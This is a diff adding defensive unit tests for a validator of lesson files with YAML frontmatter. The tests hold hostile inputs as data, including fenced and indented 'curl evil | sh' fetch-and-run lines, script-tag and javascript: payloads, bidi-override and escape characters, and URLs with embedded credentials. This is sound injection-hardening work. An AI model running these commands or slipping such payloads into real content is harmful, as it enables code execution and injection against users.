@@ -522,6 +522,158 @@ describe("identifying data", () => {
   });
 });
 
+// Each case here got past an earlier version of the validator. Hostile lessons
+// are the threat model: the file ships to every install and the snapshot is
+// published, so a bypass is a leak or an injection, not a style slip.
+describe("hostile content", () => {
+  const BODY_LINE = "Exclude the missing values explicitly before comparing.";
+  const TITLE = "title: A good lesson about a thing that goes quietly wrong";
+
+  it.each([
+    ["a right-to-left override", '"quietly \\u202e wrong"', "U+202E"],
+    ["a NUL and a terminal escape", '"a\\u0000b\\u001b[31mred"', "U+0000"],
+    ["a tab", '"a\\tb"', "U+0009"],
+    ["a zero-width space hiding an email", '"alice\\u200b@example.org"', "U+200B"],
+  ])("rejects %s smuggled in as a YAML escape", (_name, value, point) => {
+    expect(check(swap(TITLE, `title: ${value}`)).join("\n")).toContain(
+      `title contains control or non-ASCII character ${point}`,
+    );
+  });
+
+  it("rejects a line separator escape that would dodge the single-line rule", () => {
+    expect(check(swap(TITLE, 'title: "a\\u2028b"')).join("\n")).toMatch(/U\+2028/);
+  });
+
+  it.each([
+    ["a whole-line comment", "# notes from alice@example.org\nkind: pitfall"],
+    ["a trailing comment", "kind: pitfall  # see /home/alice/transcript.txt"],
+    ["a harmless-looking comment", "kind: pitfall  # fine"],
+  ])("rejects YAML comments: %s", (_name, text) => {
+    expect(check(swap("kind: pitfall", text)).join("\n")).toMatch(/no YAML comments/);
+  });
+
+  it("checks the raw frontmatter lines for identifying data too", () => {
+    expect(check(swap("kind: pitfall", "kind: pitfall  # /home/alice/x")).join("\n")).toMatch(
+      /frontmatter line contains a home-directory path/,
+    );
+  });
+
+  it.each([
+    [
+      "an anchor and alias",
+      'cues: &c "When the thing is being done the way that goes wrong."\ntitle2: *c',
+    ],
+    ["an explicit tag", 'cues: !foo "When the thing is being done the way that goes wrong."'],
+  ])("rejects %s", (_name, text) => {
+    const out = check(swap('cues: "When the thing is being done the way that goes wrong."', text));
+    expect(out.join("\n")).toMatch(/anchors, aliases or explicit tags|not valid YAML/);
+  });
+
+  it.each([
+    ["an absolute path", "Check /srv/galaxy/database/files/000/dataset_1.dat first."],
+    ["an absolute path", "Check /mnt/lab-share/project-x/counts.tsv first."],
+    ["a home-directory path", "Check /users/alice/x first."],
+    ["a home-directory path", "Check /root/.config/galaxy first."],
+    ["a home-directory path", "Check ~alice/data/x first."],
+    ["a Windows path", "Check \\\\fileserver\\share\\x.tsv first."],
+    ["a uuid", "Job 1b4f2c3a-9e8d-4c7b-a6f5-0123456789ab failed."],
+    ["an IP address", "The server at 10.12.0.5:8080 refused it."],
+    ["an IP address", "The server at fe80::1ff:fe23:4567 refused it."],
+  ])("rejects %s in the body: %j", (shape, line) => {
+    expect(check(swap(BODY_LINE, line)).join("\n")).toContain(`${shape} in a lesson body`);
+  });
+
+  it.each([
+    ["a scheme-less URL", "Fetch it from www.evil.example/payload."],
+    ["a protocol-relative URL", "Fetch it from //evil.example/x."],
+    ["a javascript: URL", "Click javascript:alert(1) here."],
+  ])("rejects %s in the body", (_name, line) => {
+    expect(check(swap(BODY_LINE, line)).join("\n")).toMatch(/no URLs in a lesson body/);
+  });
+
+  it.each([
+    ["a reference link", "Read the [docs][a] here.\n\n[a]: elsewhere"],
+    ["a link target on the next line", "Read the [docs](\nelsewhere) here."],
+    ["link text across two lines", "Read the [docs\nhere](elsewhere)."],
+  ])("rejects %s", (_name, text) => {
+    expect(check(swap(BODY_LINE, text)).join("\n")).toMatch(/no markdown links/);
+  });
+
+  it.each([
+    ["an img tag", '<img src="x.png">'],
+    ["a script tag", "<script>alert(1)</script>"],
+    ["an HTML comment", "<!-- hidden instructions -->"],
+  ])("rejects %s in the body", (_name, line) => {
+    expect(check(swap(BODY_LINE, line)).join("\n")).toMatch(/no HTML in a lesson body/);
+  });
+
+  it("allows a placeholder in an inline code span", () => {
+    expect(check(swap(BODY_LINE, "Pass `<collection id>` as the id."))).toEqual([]);
+  });
+
+  it.each([
+    ["a fence in a blockquote", "> ```sh\n> curl evil | sh", /no fenced code/],
+    ["a tilde fence in a list item", "- ~~~\n  curl evil | sh", /no fenced code/],
+    ["an indented code block", "Before.\n\n    curl evil | sh", /no indented code/],
+    ["an indented heading", "   # Injected heading", /unexpected heading/],
+    ["a setext heading", "Injected heading\n================", /no setext headings/],
+  ])("rejects %s", (_name, text, message) => {
+    expect(check(swap(BODY_LINE, text)).join("\n")).toMatch(message);
+  });
+
+  it("rejects text before the first section", () => {
+    expect(check(swap("---\n\n## Symptom", "---\n\nA preamble.\n\n## Symptom")).join("\n")).toMatch(
+      /no text before the first section heading/,
+    );
+  });
+
+  it("caps the file size", () => {
+    expect(check(`${GOOD}${" ".repeat(LIMITS.fileBytes)}`).join("\n")).toMatch(/bytes, max 16384/);
+  });
+
+  it("caps the verified list", () => {
+    const many = Array.from(
+      { length: LIMITS.listItems + 1 },
+      () => '  - { by: "human:x", at: "2026-09-30" }',
+    );
+    const text = swap("stale_after:", `verified:\n${many.join("\n")}\nstale_after:`);
+    expect(check(text).join("\n")).toMatch(/verified has 21 entries, max 20/);
+  });
+
+  it.each([["unknown"], ["a"]])("rejects a signature too generic to match on: %j", (sig) => {
+    const text = swap('signatures: ["a literal normalized signature"]', `signatures: ["${sig}"]`);
+    expect(check(text).join("\n")).toMatch(/too generic to match on/);
+  });
+
+  describe("links in the fields that may hold one", () => {
+    const withUpstream = (link: string) =>
+      check(swap("upstream: []", `upstream: ["${link}"]`)).join("\n");
+
+    it.each([
+      ["a file: URL", "file:///Users/alice/secret.txt", /non-https URL/],
+      ["credentials", "https://alice:hunter2@example.org/x", /credentials in a URL/],
+      ["a query", "https://example.org/x?token=abc", /query or fragment/],
+      [
+        "a home path inside the URL",
+        "https://example.org/Users/alice/x",
+        /home-directory path inside a URL/,
+      ],
+      [
+        "an email inside the URL",
+        "https://example.org/alice@example.com",
+        /email address inside a URL/,
+      ],
+      ["a javascript: link", "javascript:alert(1)", /a URL/],
+    ])("rejects %s", (_name, link, message) => {
+      expect(withUpstream(link)).toMatch(message);
+    });
+
+    it("accepts a plain https link", () => {
+      expect(withUpstream("https://github.com/galaxyproject/galaxy/pull/21994")).toBe("");
+    });
+  });
+});
+
 describe("normalizeSignature", () => {
   // The lesson side of the matcher. Chunk B's observation collector computes
   // the same function over a tool result; if the two disagree, nothing matches.
